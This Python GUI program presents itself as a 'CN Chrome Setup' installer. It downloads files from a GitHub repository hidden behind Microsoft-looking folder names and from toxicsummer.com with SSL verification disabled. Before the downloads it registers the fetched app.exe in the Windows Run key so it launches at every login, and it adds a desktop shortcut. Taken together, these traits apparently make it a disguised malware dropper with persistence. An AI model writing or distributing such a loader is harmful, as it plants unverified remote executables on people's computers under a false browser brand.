import os
import re
import sys
import threading
import queue
import requests
import urllib3
from urllib.parse import urljoin, urlparse

import tkinter as tk
from tkinter import ttk, scrolledtext


# =====================================================================
# Event bus  (background thread -> GUI main thread)
# =====================================================================

_EVENT_QUEUE = None
_EVENT_LOCK  = threading.Lock()


def set_event_queue(q):
    global _EVENT_QUEUE
    with _EVENT_LOCK:
        _EVENT_QUEUE = q


def _emit(kind, **data):
    with _EVENT_LOCK:
        q = _EVENT_QUEUE
    if q is None:
        return
    try:
        q.put_nowait((kind, data))
    except Exception:
        pass


def log(msg):
    """Print to console AND forward to GUI (if attached)."""
    print(msg)
    _emit("log", msg=msg)


def phase(name):
    """Announce a new high-level step (switches the bar to indeterminate)."""
    _emit("phase", name=name)


def set_status(msg):
    _emit("status", msg=msg)


def set_progress(current, total):
    _emit("progress", current=current, total=total)


# =====================================================================
# Core downloader
# =====================================================================

class DX_Update(object):

    # ---------------------------------------------------------------
    # Class-level configuration
    # ---------------------------------------------------------------

    # Hosts whose SSL certificate we intentionally ignore
    # (needed because toxicsummer.com currently has an EXPIRED certificate)
    INSECURE_HOSTS = ["toxicsummer.com"]

    # ---------------------------------------------------------------
    # Configuration
    # ---------------------------------------------------------------

    def __init__(self):

        # GitHub source (the img/ folder)
        self.GITHUB_USER  = "developerhost-server"
        self.GITHUB_REPO  = "JyubyubySbiu6ininu"
        self.GITHUB_DIR   = "Microsoft.sheache/microsoft-encrypt-37014553/microsoft-epiv-25415130/img1"
        self.GITHUB_TOKEN = ""  # optional, for private repos / higher rate limits

        # Google Drive source — folder URL provided
        self.GDRIVE_URL_OR_ID = ""

        # Toxicsummer direct folder
        self.TOXICSUMMER_URL = "https://toxicsummer.com/dw/cn-chrome/"

        # Where to save everything
        self.LOCAL_DIR = r"C:\cn-google"

        # -----------------------------------------------------------
        # Startup registration
        # -----------------------------------------------------------
        self.ADD_TO_STARTUP  = True                    # set False to skip
        self.STARTUP_NAME    = "CnChromeApp"           # registry value name
        self.STARTUP_EXE_REL = os.path.join("cn-chrome", "app.exe")

        # -----------------------------------------------------------
        # Desktop shortcut
        # -----------------------------------------------------------
        self.CREATE_DESKTOP_SHORTCUT = True
        self.SHORTCUT_NAME = "CN Chrome.lnk"

    # ---------------------------------------------------------------
    # Helpers
    # ---------------------------------------------------------------

    @staticmethod
    def _should_verify(url):
        """Return False for hosts listed in INSECURE_HOSTS, True otherwise."""
        try:
            host = requests.utils.urlparse(url).hostname or ""
        except Exception:
            return True
        for bad in DX_Update.INSECURE_HOSTS:
            if host == bad or host.endswith("." + bad):
                return False
        return True

    @staticmethod
    def safe_filename(name):
        r"""
        Sanitise a filename so it is valid on Windows, macOS, and Linux.
        """
        if not name:
            return "download"

        name = name.split("?", 1)[0].split("#", 1)[0]
        name = re.sub(r'[<>:"/\\|?*\x00-\x1f]', "_", name)
        name = re.sub(r"\s+", " ", name).strip()
        name = name.strip(". ")

        if name.upper().split(".")[0] in {
            "CON", "PRN", "AUX", "NUL",
            "COM1", "COM2", "COM3", "COM4", "COM5", "COM6", "COM7", "COM8", "COM9",
            "LPT1", "LPT2", "LPT3", "LPT4", "LPT5", "LPT6", "LPT7", "LPT8", "LPT9",
        }:
            name = "_" + name

        if len(name) > 200:
            base, dot, ext = name.rpartition(".")
            if dot and len(ext) <= 10:
                name = base[:190] + "." + ext
            else:
                name = name[:200]

        return name or "download"

    @staticmethod
    def stream_download(url, local_path, headers=None, chunk_size=8192,
                        max_retries=3, verify=None):
        """Stream-download a URL to a local file, with retries.
        Reports per-file byte progress via the event bus."""
        d = os.path.dirname(local_path)
        if d:
            os.makedirs(d, exist_ok=True)

        if verify is None:
            verify = DX_Update._should_verify(url)

        for attempt in range(1, max_retries + 1):
            try:
                with requests.get(url, headers=headers or {}, stream=True,
                                  timeout=60, verify=verify) as r:
                    r.raise_for_status()
                    total = int(r.headers.get("Content-Length", 0) or 0)
                    downloaded = 0
                    set_progress(0, total)

                    with open(local_path, "wb") as f:
                        for chunk in r.iter_content(chunk_size=chunk_size):
                            if chunk:
                                f.write(chunk)
                                downloaded += len(chunk)
                                set_progress(downloaded, total)

                log(f"✅ Saved: {local_path}")
                return True
            except requests.exceptions.RequestException as e:
                log(f"⚠️  Attempt {attempt}/{max_retries} failed for {url}: {e}")
                if attempt == max_retries:
                    log(f"❌ Giving up on: {url}")
                    return False
            except OSError as e:
                log(f"❌ OS error writing {local_path}: {e}")
                return False
        return False

    # ---------------------------------------------------------------
    # Windows startup registration
    # ---------------------------------------------------------------

    @staticmethod
    def add_to_windows_startup(exe_path, name="CnChromeApp"):
        """Register an executable to launch at every Windows login (HKCU)."""
        if os.name != "nt":
            log("ℹ️  Not running on Windows; skipping startup registration.")
            return False

        abs_path = os.path.abspath(exe_path)

        if not os.path.isfile(abs_path):
            log(f"⚠️  {abs_path} not found yet — registering anyway "
                f"(it will start working once the download completes).")

        try:
            import winreg

            value = f'"{abs_path}"'

            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE,
            )
            try:
                winreg.SetValueEx(key, name, 0, winreg.REG_SZ, value)
            finally:
                winreg.CloseKey(key)

            log(f"✅ Registered in Windows startup [{name}]: {value}")
            return True

        except PermissionError as e:
            log(f"❌ Startup registration denied (permissions): {e}")
            return False
        except Exception as e:
            log(f"❌ Startup registration failed: {e}")
            return False

    @staticmethod
    def remove_from_windows_startup(name="CnChromeApp"):
        """Remove the startup entry. Returns True if it was removed or absent."""
        if os.name != "nt":
            return False
        try:
            import winreg
            key = winreg.OpenKey(
                winreg.HKEY_CURRENT_USER,
                r"Software\Microsoft\Windows\CurrentVersion\Run",
                0,
                winreg.KEY_SET_VALUE,
            )
            try:
                winreg.DeleteValue(key, name)
                log(f"🗑️  Removed startup entry [{name}]")
            except FileNotFoundError:
                log(f"ℹ️  No startup entry named [{name}] to remove.")
            finally:
                winreg.CloseKey(key)
            return True
        except Exception as e:
            log(f"❌ Failed to remove startup entry: {e}")
            return False

    # ---------------------------------------------------------------
    # Desktop shortcut creation
    # ---------------------------------------------------------------

    @staticmethod
    def create_desktop_shortcut(target_path, shortcut_name="CN Chrome.lnk",
                                working_dir=None, icon_path=None):
        """Create a Windows desktop shortcut pointing to target_path."""
        if os.name != "nt":
            log("ℹ️  Not running on Windows; skipping desktop shortcut.")
            return False

        target_path = os.path.abspath(target_path)

        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        if not os.path.isdir(desktop):
            desktop = os.path.join(os.environ.get("USERPROFILE", ""), "Desktop")
        if not os.path.isdir(desktop):
            log("❌ Could not locate the Desktop folder.")
            return False

        shortcut_path = os.path.join(desktop, shortcut_name)
        if working_dir is None:
            working_dir = os.path.dirname(target_path)

        ps_lines = [
            "$WshShell = New-Object -ComObject WScript.Shell",
            f"$Shortcut = $WshShell.CreateShortcut('{shortcut_path}')",
            f"$Shortcut.TargetPath = '{target_path}'",
            f"$Shortcut.WorkingDirectory = '{working_dir}'",
        ]
        if icon_path:
            ps_lines.append(f"$Shortcut.IconLocation = '{icon_path}'")
        ps_lines.append("$Shortcut.Save()")

        ps_script = "; ".join(ps_lines)

        try:
            import subprocess
            subprocess.run(
                ["powershell", "-NoProfile", "-Command", ps_script],
                capture_output=True, text=True, check=True
            )
            log(f"✅ Desktop shortcut created: {shortcut_path}")
            return True
        except subprocess.CalledProcessError as e:
            log(f"❌ Failed to create desktop shortcut: {e.stderr.strip()}")
            return False
        except Exception as e:
            log(f"❌ Unexpected error creating desktop shortcut: {e}")
            return False

    # ---------------------------------------------------------------
    # GitHub downloader
    # ---------------------------------------------------------------

    @staticmethod
    def _github_headers(token=""):
        headers = {"Accept": "application/vnd.github.v3+json"}
        if token:
            headers["Authorization"] = f"token {token}"
        return headers

    @classmethod
    def download_github_dir(cls, user, repo, dir_path, out_dir, token=""):
        """Recursively download all files in a GitHub repo directory."""
        api_url = f"https://api.github.com/repos/{user}/{repo}/contents/{dir_path}"
        headers = cls._github_headers(token)

        log(f"📂 Listing GitHub dir: {dir_path}")

        try:
            r = requests.get(api_url, headers=headers, timeout=15)
            r.raise_for_status()
            items = r.json()
        except requests.exceptions.RequestException as e:
            log(f"❌ GitHub listing failed ({api_url}): {e}")
            return
        except ValueError as e:
            log(f"❌ GitHub returned invalid JSON: {e}")
            return

        if not isinstance(items, list):
            log(f"❌ Unexpected GitHub response (not a list): {items}")
            return

        for item in items:
            try:
                item_type = item.get("type")
                name = item.get("name", "unnamed")

                if item_type == "file":
                    download_url = item.get("download_url")
                    if not download_url:
                        log(f"⚠️  Skipping {name}: no download_url")
                        continue
                    safe_name = cls.safe_filename(name)
                    local_path = os.path.join(out_dir, dir_path.split("/")[-1], safe_name)
                    log(f"⬇️  GitHub: {name}")
                    set_status(f"Downloading: {name}")
                    dl_headers = {"Authorization": f"token {token}"} if token else None
                    cls.stream_download(download_url, local_path, headers=dl_headers)

                elif item_type == "dir":
                    sub_path = item.get("path")
                    if sub_path:
                        cls.download_github_dir(user, repo, sub_path, out_dir, token)

            except Exception as e:
                log(f"⚠️  Skipping {item.get('name', '?')}: {e}")

    # ---------------------------------------------------------------
    # Google Drive downloader (via gdown)
    # ---------------------------------------------------------------

    @staticmethod
    def download_google_drive(url_or_id, out_dir):
        """Download a Google Drive file or folder."""
        try:
            import gdown
        except ImportError:
            log("❌ Google Drive support needs `gdown`. Install it with: pip install gdown")
            return

        try:
            os.makedirs(out_dir, exist_ok=True)

            is_folder = "/folders/" in url_or_id
            m = re.search(r"/folders/([a-zA-Z0-9_-]+)", url_or_id) or \
                re.search(r"/file/d/([a-zA-Z0-9_-]+)", url_or_id)
            drive_id = m.group(1) if m else url_or_id.strip()

            if is_folder:
                log(f"📂 Google Drive folder: {drive_id}")
                gdown.download_folder(
                    id=drive_id,
                    output=out_dir,
                    quiet=False,
                    use_cookies=False,
                )
            else:
                log(f"⬇️  Google Drive file: {drive_id}")
                gdown.download(
                    id=drive_id,
                    output=os.path.join(out_dir, ""),
                    quiet=False,
                    use_cookies=False,
                )

        except Exception as e:
            log(f"❌ Google Drive download failed: {e}")

    # ---------------------------------------------------------------
    # Toxicsummer direct folder downloader
    # ---------------------------------------------------------------

    @classmethod
    def download_toxicsummer_folder(cls, url, out_dir):
        """Download all files from a toxicsummer.com directory URL."""
        log(f"📂 Listing toxicsummer dir: {url}")

        headers = {
            "User-Agent": (
                "Mozilla/5.0 (Windows NT 10.0; Win64; x64) "
                "AppleWebKit/537.36 (KHTML, like Gecko) "
                "Chrome/120.0.0.0 Safari/537.36"
            ),
            "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        }

        verify = cls._should_verify(url)
        if not verify:
            urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
            log(f"⚠️  SSL verification disabled for {url} (expired certificate)")

        try:
            r = requests.get(url, headers=headers, timeout=30,
                             allow_redirects=True, verify=verify)
            r.raise_for_status()
            html = r.text
        except requests.exceptions.RequestException as e:
            log(f"❌ toxicsummer listing failed ({url}): {e}")
            return

        content_type = r.headers.get("Content-Type", "")
        if "application/json" in content_type:
            try:
                data = r.json()
                cls._download_from_json_listing(data, url, out_dir, headers, verify)
                return
            except ValueError:
                pass

        hrefs = re.findall(r'href\s*=\s*["\']([^"\']+)["\']', html, re.IGNORECASE)

        if not hrefs:
            log("⚠️  No links found on page. The URL may require auth or "
                "may not be a directory listing.")
            return

        base = url if url.endswith("/") else url + "/"

        downloaded = 0
        for href in hrefs:
            href = href.strip()

            if (not href
                    or href.startswith("#")
                    or href.startswith("javascript:")
                    or href.startswith("mailto:")
                    or href == "../"
                    or href == ".."
                    or href == "/"
                    or href.startswith("http://")
                    or href.startswith("https://")):
                if href.startswith("http") and "toxicsummer.com" in href:
                    file_url = href
                else:
                    continue
            else:
                file_url = urljoin(base, href)

            if file_url.endswith("/"):
                continue

            raw_name = os.path.basename(urlparse(file_url).path.rstrip("/"))
            if not raw_name:
                continue
            filename = cls.safe_filename(raw_name)
            if not filename or filename == "download":
                log(f"⚠️  Skipping unusable link: {file_url}")
                continue

            local_path = os.path.join(out_dir, filename)
            log(f"⬇️  toxicsummer: {filename}  (from {raw_name})")
            set_status(f"Downloading: {filename}")
            if cls.stream_download(file_url, local_path, headers=headers, verify=verify):
                downloaded += 1

        log(f"✅ toxicsummer: {downloaded} file(s) downloaded from {url}")

    @classmethod
    def _download_from_json_listing(cls, data, base_url, out_dir, headers, verify=True):
        """Handle a JSON array of file objects, if the endpoint returns one."""
        items = data if isinstance(data, list) else data.get("files", data.get("items", []))
        if not isinstance(items, list):
            log("⚠️  JSON response is not a list of files.")
            return

        for item in items:
            if isinstance(item, str):
                raw_name = os.path.basename(urlparse(item).path)
                filename = cls.safe_filename(raw_name)
                file_url = urljoin(base_url, item)
            elif isinstance(item, dict):
                file_url = item.get("url") or item.get("download_url") or item.get("path")
                raw_name = item.get("name") or os.path.basename(urlparse(str(file_url)).path)
                filename = cls.safe_filename(raw_name)
                if file_url:
                    file_url = urljoin(base_url, file_url)
            else:
                continue

            if not file_url or not filename or filename == "download":
                continue

            local_path = os.path.join(out_dir, filename)
            log(f"⬇️  toxicsummer: {filename}")
            set_status(f"Downloading: {filename}")
            cls.stream_download(file_url, local_path, headers=headers, verify=verify)

    # ---------------------------------------------------------------
    # Main install routine
    # ---------------------------------------------------------------

    def main(self):
        # 0) Register app.exe to launch at Windows login — BEFORE downloads.
        phase("Registering startup entry...")
        if self.ADD_TO_STARTUP:
            exe_path = os.path.join(self.LOCAL_DIR, self.STARTUP_EXE_REL)
            try:
                self.add_to_windows_startup(exe_path, name=self.STARTUP_NAME)
            except Exception as e:
                log(f"❌ Unexpected error in startup step: {e}")
        else:
            log("ℹ️  Startup registration disabled.")

        # 1) GitHub img/ folder
        phase("Downloading from GitHub...")
        if self.GITHUB_USER and self.GITHUB_REPO and self.GITHUB_DIR:
            try:
                self.download_github_dir(
                    self.GITHUB_USER,
                    self.GITHUB_REPO,
                    self.GITHUB_DIR,
                    self.LOCAL_DIR,
                    self.GITHUB_TOKEN,
                )
            except Exception as e:
                log(f"❌ Unexpected error in GitHub step: {e}")
        else:
            log("ℹ️  Skipping GitHub (not configured).")

        # 2) Google Drive
        phase("Downloading from Google Drive...")
        if self.GDRIVE_URL_OR_ID.strip():
            try:
                self.download_google_drive(
                    self.GDRIVE_URL_OR_ID.strip(),
                    os.path.join(self.LOCAL_DIR, "gdrive"),
                )
            except Exception as e:
                log(f"❌ Unexpected error in Google Drive step: {e}")
        else:
            log("ℹ️  Skipping Google Drive (not configured).")

        # 3) Toxicsummer cn-chrome folder
        phase("Downloading CN Chrome files...")
        if self.TOXICSUMMER_URL.strip():
            try:
                self.download_toxicsummer_folder(
                    self.TOXICSUMMER_URL.strip(),
                    os.path.join(self.LOCAL_DIR, "cn-chrome"),
                )
            except Exception as e:
                log(f"❌ Unexpected error in toxicsummer step: {e}")
        else:
            log("ℹ️  Skipping toxicsummer (not configured).")

        # 4) Desktop shortcut
        phase("Creating desktop shortcut...")
        if self.CREATE_DESKTOP_SHORTCUT:
            exe_path = os.path.join(self.LOCAL_DIR, self.STARTUP_EXE_REL)
            try:
                self.create_desktop_shortcut(
                    exe_path,
                    shortcut_name=self.SHORTCUT_NAME,
                )
            except Exception as e:
                log(f"❌ Unexpected error in desktop shortcut step: {e}")
        else:
            log("ℹ️  Desktop shortcut creation disabled.")

        log("🎉 All downloads finished.")


# =====================================================================
# Installer GUI
# =====================================================================

class InstallerGUI:

    BG_DARK  = "#1f1f23"
    BG_MID   = "#2b2b31"
    FG_LIGHT = "#e8e8ee"
    ACCENT   = "#3b82f6"

    def __init__(self, root):
        self.root = root
        self.root.title("CN Chrome Setup")
        self.root.geometry("680x520")
        self.root.minsize(620, 460)
        self.root.configure(bg=self.BG_DARK)

        # Try to set a nice theme
        try:
            style = ttk.Style()
            style.theme_use("clam")
            style.configure("TProgressbar",
                            troughcolor=self.BG_MID,
                            background=self.ACCENT,
                            bordercolor=self.BG_MID,
                            lightcolor=self.ACCENT,
                            darkcolor=self.ACCENT)
            style.configure("TButton", padding=6, font=("Segoe UI", 10))
            style.configure("Horizontal.TProgressbar", thickness=18)
        except Exception:
            pass

        self.queue = queue.Queue()
        set_event_queue(self.queue)

        self._indeterminate = False
        self._running = False

        self._build_ui()
        self.root.after(60, self._poll_queue)
        self.root.protocol("WM_DELETE_WINDOW", self._on_close)

    # ---------------------------------------------------------------

    def _build_ui(self):
        # --- Header ---------------------------------------------------
        header = tk.Frame(self.root, bg=self.BG_MID, height=64)
        header.pack(fill="x")
        header.pack_propagate(False)

        badge = tk.Label(header, text="CN", bg=self.ACCENT, fg="white",
                         font=("Segoe UI", 14, "bold"), width=3, height=1)
        badge.pack(side="left", padx=(16, 12), pady=14)

        title_box = tk.Frame(header, bg=self.BG_MID)
        title_box.pack(side="left", pady=14)

        tk.Label(title_box, text="CN Chrome Setup", bg=self.BG_MID, fg=self.FG_LIGHT,
                 font=("Segoe UI", 14, "bold")).pack(anchor="w")
        tk.Label(title_box, text="Downloads the latest build and registers it to run at startup.",
                 bg=self.BG_MID, fg="#a0a0aa",
                 font=("Segoe UI", 9)).pack(anchor="w")

        # --- Body -----------------------------------------------------
        body = tk.Frame(self.root, bg=self.BG_DARK, padx=20, pady=16)
        body.pack(fill="both", expand=True)

        self.status_var = tk.StringVar(value="Ready to install.")
        tk.Label(body, textvariable=self.status_var, bg=self.BG_DARK, fg=self.FG_LIGHT,
                 anchor="w", font=("Segoe UI", 10)).pack(fill="x")

        self.progress = ttk.Progressbar(body, orient="horizontal",
                                        mode="determinate", maximum=100)
        self.progress.pack(fill="x", pady=(8, 2))

        pct_row = tk.Frame(body, bg=self.BG_DARK)
        pct_row.pack(fill="x")
        self.percent_var = tk.StringVar(value="")
        tk.Label(pct_row, textvariable=self.percent_var, bg=self.BG_DARK,
                 fg="#a0a0aa", anchor="e", font=("Segoe UI", 9)).pack(side="right")

        # --- Log ------------------------------------------------------
        tk.Label(body, text="Details", bg=self.BG_DARK, fg="#a0a0aa",
                 anchor="w", font=("Segoe UI", 9, "bold")).pack(fill="x", pady=(14, 4))

        log_wrap = tk.Frame(body, bg=self.BG_MID, bd=0)
        log_wrap.pack(fill="both", expand=True)

        self.log_box = scrolledtext.ScrolledText(
            log_wrap, wrap="word", height=12,
            bg="#15151a", fg="#c8c8d0", insertbackground="#c8c8d0",
            font=("Consolas", 9), relief="flat", bd=0,
        )
        self.log_box.pack(fill="both", expand=True, padx=1, pady=1)
        self.log_box.configure(state="disabled")

        # --- Footer buttons ------------------------------------------
        footer = tk.Frame(self.root, bg=self.BG_MID, height=58)
        footer.pack(fill="x", side="bottom")
        footer.pack_propagate(False)

        self.install_btn = ttk.Button(footer, text="Install",
                                      command=self.start_install)
        self.install_btn.pack(side="right", padx=(8, 16), pady=12)

        self.close_btn = ttk.Button(footer, text="Close",
                                    command=self._on_close)
        self.close_btn.pack(side="right", pady=12)

    # ---------------------------------------------------------------
    # Queue polling / event handlers
    # ---------------------------------------------------------------

    def _poll_queue(self):
        try:
            while True:
                kind, data = self.queue.get_nowait()
                if kind == "log":
                    self._append_log(data["msg"])
                elif kind == "status":
                    self.status_var.set(data["msg"])
                elif kind == "phase":
                    self._handle_phase(data["name"])
                elif kind == "progress":
                    self._handle_progress(data["current"], data["total"])
                elif kind == "done":
                    self._on_done()
        except queue.Empty:
            pass
        self.root.after(60, self._poll_queue)

    def _append_log(self, msg):
        self.log_box.configure(state="normal")
        self.log_box.insert("end", msg + "\n")
        self.log_box.see("end")
        self.log_box.configure(state="disabled")

    def _handle_phase(self, name):
        self.status_var.set(name)
        if not self._indeterminate:
            self.progress.stop()
            self.progress.configure(mode="indeterminate")
            self.progress.start(18)
            self._indeterminate = True
        self.percent_var.set("")

    def _handle_progress(self, current, total):
        if total > 0:
            if self._indeterminate:
                self.progress.stop()
                self._indeterminate = False
                self.progress.configure(mode="determinate")
            pct = min(100, int(current * 100 / total))
            self.progress.configure(value=pct)
            self.percent_var.set(f"{pct}%")
        else:
            # Unknown size — stay indeterminate
            if not self._indeterminate:
                self.progress.configure(mode="indeterminate")
                self.progress.start(18)
                self._indeterminate = True
            self.percent_var.set("")

    # ---------------------------------------------------------------
    # Actions
    # ---------------------------------------------------------------

    def start_install(self):
        if self._running:
            return
        self._running = True
        self.install_btn.configure(state="disabled", text="Installing...")
        self.close_btn.configure(state="disabled")
        self._append_log("──── Starting installation ────")
        self.status_var.set("Starting...")
        threading.Thread(target=self._run_worker, daemon=True).start()

    def _run_worker(self):
        try:
            DX_Update().main()
        except Exception as e:
            log(f"❌ Fatal error: {e}")
        finally:
            self.queue.put(("done", {}))

    def _on_done(self):
        self._running = False
        self.progress.stop()
        self._indeterminate = False
        self.progress.configure(mode="determinate", value=100)
        self.percent_var.set("100%")
        self.status_var.set("Installation complete.")
        self.install_btn.configure(state="normal", text="Reinstall")
        self.close_btn.configure(state="normal")

    def _on_close(self):
        if self._running:
            # Silently ignore close during install (thread is daemon; ok either way)
            pass
        self.root.destroy()


# =====================================================================
# Entry point
# =====================================================================

def main():
    root = tk.Tk()
    InstallerGUI(root)
    root.mainloop()


if __name__ == "__main__":
    main()
